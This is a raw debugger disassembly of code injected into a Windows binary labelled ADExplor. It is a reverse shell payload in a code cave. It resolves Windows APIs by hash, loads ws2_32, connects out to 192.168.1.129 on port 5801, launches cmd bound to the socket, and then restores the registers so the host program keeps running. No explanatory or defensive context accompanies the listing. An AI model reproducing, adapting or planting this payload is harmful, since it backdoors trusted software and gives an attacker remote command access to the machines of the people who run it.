0046176D   90                       NOP
0046176E   60                       PUSHAD
0046176F   9C                       PUSHFD
00461770   90                       NOP
00461771   FC                       CLD
00461772   E8 82000000              CALL ADExplor.004617F9
00461777   60                       PUSHAD
00461778   89E5                     MOV EBP, ESP
0046177A   31C0                     XOR EAX, EAX
0046177C   64:8B50 30               MOV EDX, DWORD PTR FS:[EAX+30]
00461780   8B52 0C                  MOV EDX, DWORD PTR DS:[EDX+C]
00461783   8B52 14                  MOV EDX, DWORD PTR DS:[EDX+14]
00461786   8B72 28                  MOV ESI, DWORD PTR DS:[EDX+28]
00461789   0FB74A 26                MOVZX ECX, WORD PTR DS:[EDX+26]
0046178D   31FF                     XOR EDI, EDI
0046178F   AC                       LODS BYTE PTR DS:[ESI]
00461790   3C 61                    CMP AL, 61
00461792   7C 02                    JL SHORT ADExplor.00461796
00461794   2C 20                    SUB AL, 20
00461796   C1CF 1A                  ROR EDI, 1A
00461799   01C7                     ADD EDI, EAX
0046179B  ^E2 F2                    LOOPD SHORT ADExplor.0046178F
0046179D   52                       PUSH EDX
0046179E   57                       PUSH EDI
0046179F   8B52 10                  MOV EDX, DWORD PTR DS:[EDX+10]
004617A2   8B4A 3C                  MOV ECX, DWORD PTR DS:[EDX+3C]
004617A5   8B4C11 78                MOV ECX, DWORD PTR DS:[ECX+EDX+78]
004617A9   E3 48                    JECXZ SHORT ADExplor.004617F3
004617AB   01D1                     ADD ECX, EDX
004617AD   51                       PUSH ECX
004617AE   8B59 20                  MOV EBX, DWORD PTR DS:[ECX+20]
004617B1   01D3                     ADD EBX, EDX
004617B3   8B49 18                  MOV ECX, DWORD PTR DS:[ECX+18]
004617B6   E3 3A                    JECXZ SHORT ADExplor.004617F2
004617B8   49                       DEC ECX
004617B9   8B348B                   MOV ESI, DWORD PTR DS:[EBX+ECX*4]
004617BC   01D6                     ADD ESI, EDX
004617BE   31FF                     XOR EDI, EDI
004617C0   AC                       LODS BYTE PTR DS:[ESI]
004617C1   C1CF 1A                  ROR EDI, 1A
004617C4   01C7                     ADD EDI, EAX
004617C6   38E0                     CMP AL, AH
004617C8  ^75 F6                    JNZ SHORT ADExplor.004617C0
004617CA   037D F8                  ADD EDI, DWORD PTR SS:[EBP-8]
004617CD   3B7D 24                  CMP EDI, DWORD PTR SS:[EBP+24]
004617D0  ^75 E4                    JNZ SHORT ADExplor.004617B6
004617D2   58                       POP EAX
004617D3   8B58 24                  MOV EBX, DWORD PTR DS:[EAX+24]
004617D6   01D3                     ADD EBX, EDX
004617D8   66:8B0C4B                MOV CX, WORD PTR DS:[EBX+ECX*2]
004617DC   8B58 1C                  MOV EBX, DWORD PTR DS:[EAX+1C]
004617DF   01D3                     ADD EBX, EDX
004617E1   8B048B                   MOV EAX, DWORD PTR DS:[EBX+ECX*4]
004617E4   01D0                     ADD EAX, EDX
004617E6   894424 24                MOV DWORD PTR SS:[ESP+24], EAX
004617EA   5B                       POP EBX
004617EB   5B                       POP EBX
004617EC   61                       POPAD
004617ED   59                       POP ECX
004617EE   5A                       POP EDX
004617EF   51                       PUSH ECX
004617F0   FFE0                     JMP NEAR EAX
004617F2   5F                       POP EDI
004617F3   5F                       POP EDI
004617F4   5A                       POP EDX
004617F5   8B12                     MOV EDX, DWORD PTR DS:[EDX]
004617F7  ^EB 8D                    JMP SHORT ADExplor.00461786
004617F9   5D                       POP EBP
004617FA   68 33320000              PUSH 3233
004617FF   68 7773325F              PUSH 5F327377
00461804   54                       PUSH ESP
00461805   68 6F8ED4DC              PUSH DCD48E6F
0046180A   FFD5                     CALL NEAR EBP
0046180C   B8 90010000              MOV EAX, 190
00461811   29C4                     SUB ESP, EAX
00461813   54                       PUSH ESP
00461814   50                       PUSH EAX
00461815   68 D09CE382              PUSH 82E39CD0
0046181A   FFD5                     CALL NEAR EBP
0046181C   50                       PUSH EAX
0046181D   50                       PUSH EAX
0046181E   50                       PUSH EAX
0046181F   50                       PUSH EAX
00461820   40                       INC EAX
00461821   50                       PUSH EAX
00461822   40                       INC EAX
00461823   50                       PUSH EAX
00461824   68 C080A7FB              PUSH FBA780C0
00461829   FFD5                     CALL NEAR EBP
0046182B   97                       XCHG EAX, EDI
0046182C   6A 05                    PUSH 5
0046182E   68 C0A80181              PUSH 8101A8C0
00461833   68 020016A9              PUSH A9160002
00461838   89E6                     MOV ESI, ESP
0046183A   6A 10                    PUSH 10
0046183C   56                       PUSH ESI
0046183D   57                       PUSH EDI
0046183E   68 7DBDA539              PUSH 39A5BD7D
00461843   FFD5                     CALL NEAR EBP
00461845   85C0                     TEST EAX, EAX
00461847   74 0C                    JE SHORT ADExplor.00461855
00461849   FF4E 08                  DEC DWORD PTR DS:[ESI+8]
0046184C  ^75 EC                    JNZ SHORT ADExplor.0046183A
0046184E   83EC 5C                  SUB ESP, 5C
00461851   EB 62                    JMP SHORT ADExplor.004618B5
00461853   90                       NOP
00461854   90                       NOP
00461855   68 636D6400              PUSH 646D63
0046185A   89E3                     MOV EBX, ESP
0046185C   57                       PUSH EDI
0046185D   57                       PUSH EDI
0046185E   57                       PUSH EDI
0046185F   31F6                     XOR ESI, ESI
00461861   6A 12                    PUSH 12
00461863   59                       POP ECX
00461864   56                       PUSH ESI
00461865  ^E2 FD                    LOOPD SHORT ADExplor.00461864
00461867   66:C74424 3C 0101        MOV WORD PTR SS:[ESP+3C], 101
0046186E   8D4424 10                LEA EAX, DWORD PTR SS:[ESP+10]
00461872   C600 44                  MOV BYTE PTR DS:[EAX], 44
00461875   54                       PUSH ESP
00461876   50                       PUSH EAX
00461877   56                       PUSH ESI
00461878   56                       PUSH ESI
00461879   56                       PUSH ESI
0046187A   46                       INC ESI
0046187B   56                       PUSH ESI
0046187C   4E                       DEC ESI
0046187D   56                       PUSH ESI
0046187E   56                       PUSH ESI
0046187F   53                       PUSH EBX
00461880   56                       PUSH ESI
00461881   68 04EC6855              PUSH 5568EC04
00461886   FFD5                     CALL NEAR EBP
00461888   89E0                     MOV EAX, ESP
0046188A   90                       NOP
0046188B   56                       PUSH ESI
0046188C   46                       INC ESI
0046188D   FF30                     PUSH DWORD PTR DS:[EAX]
0046188F   68 99DBEDD6              PUSH D6EDDB99
00461894   FFD5                     CALL NEAR EBP
00461896   BB 9D1EE9D7              MOV EBX, D7E91E9D
0046189B   68 2160174F              PUSH 4F176021
004618A0   FFD5                     CALL NEAR EBP
004618A2   3C 06                    CMP AL, 6
004618A4   7C 0A                    JL SHORT ADExplor.004618B0
004618A6   80FB E0                  CMP BL, 0E0
004618A9   75 05                    JNZ SHORT ADExplor.004618B0
004618AB   BB 699C2BB3              MOV EBX, B32B9C69
004618B0   6A 00                    PUSH 0
004618B2   53                       PUSH EBX
004618B3   FFD5                     CALL NEAR EBP
004618B5   90                       NOP
004618B6   81C4 00020000            ADD ESP, 200
004618BC   90                       NOP
004618BD   9D                       POPFD
004618BE   61                       POPAD
004618BF   90                       NOP

